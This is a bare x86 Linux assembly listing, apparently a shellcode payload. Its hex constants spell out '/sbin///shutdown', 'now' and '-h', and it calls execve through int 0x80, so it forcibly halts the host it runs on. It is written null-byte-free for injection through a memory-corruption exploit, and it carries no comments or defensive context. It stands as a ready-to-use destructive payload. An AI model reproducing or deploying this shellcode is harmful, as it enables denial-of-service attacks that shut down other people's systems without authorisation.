global _start

segment .text

_start:
  xor eax,eax
  xor edx,edx
  push eax
  push word 0x682d
  mov esi,esp
  push eax
  push byte +0x6e
  mov word [esp+0x1],0x776f
  mov edi,esp
  push eax
  push dword 0x6e776f64
  push dword 0x74756873
  push dword 0x2f2f2f6e
  push dword 0x6962732f
  mov ebx,esp
  push edx
  push esi
  push edi
  push ebx
  mov ecx,esp
  mov al,0xb
  int 0x80
